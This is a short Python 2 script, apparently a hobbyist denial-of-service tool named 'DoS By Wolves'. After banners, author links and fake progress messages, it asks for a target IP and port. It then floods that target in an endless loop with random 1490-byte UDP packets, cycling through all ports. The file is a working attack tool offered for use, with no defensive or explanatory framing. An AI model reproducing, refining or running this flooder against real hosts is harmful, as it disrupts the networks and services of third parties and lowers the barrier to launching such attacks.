# DoS By Wolves (dos-bw)
# Based On Linux With Python2
# Python Editor SexyWerewolf
# This Is An Open Source Software
# (command) user@linux# python2 (FILE_NAME.py)
# ================================================

print ""
print "You Need Root Accsess To Download: figlet"
print ""

# Download figlet
import os
os.system("sudo apt-get install -y figlet")
# =============================================

# Imports
import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
# ====================================

# Socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
# =========================================================

# The Numbers Of Wolves
import random
rnumber = random.randint(5500,8000)
# ===================================

# Some Prints
os.system("clear")
os.system("figlet Attack By Wolves")
print
time.sleep(1)
print "Author   : Dachi Wolf / AKA: SexyWerewolf"
time.sleep(1)
print "My WebSite   : https://www.werewolf.gr"
time.sleep(1)
print "My Github   : https://github.com/sexywerewolf"
time.sleep(1)
print "Discord Server  : https://discord.gg/u49TErx9et"
print ""
time.sleep(3)
print "Starting.."
time.sleep(1)
print "Checking The Wolves.."
time.sleep(2)
print "Found", rnumber, "Wolves"
time.sleep(1)
print "Downloading The Wolves.."
time.sleep(5)
print "Done!"
time.sleep(1)
print "You Have", rnumber, "Wolves!"
time.sleep(1)

print ""

print "Aaaaooooooo.."
time.sleep(1)

print ""

print
ip = raw_input("IP Target : ")
port = input("Port       : ")
print""
print "When You Want Press ctrl + c To Stop The Attack"
time.sleep(5)
os.system("clear")
os.system("figlet Attack!!!")
print "[                    ] 0%"
time.sleep(1)
print "[Woof!               ] 25% "
time.sleep(2)
print "[Woof!Woof!          ] 50%"
time.sleep(1)
print "[Woof!Woof!Woof!     ] 75%"
time.sleep(3)
print "[Woof!Woof!Woof!Woof!] 100%"
time.sleep(2)

print "figlet Attack!!!"

# The Data For The Attack
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s Wolves To %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
# =============================

#END OF SCRYPT
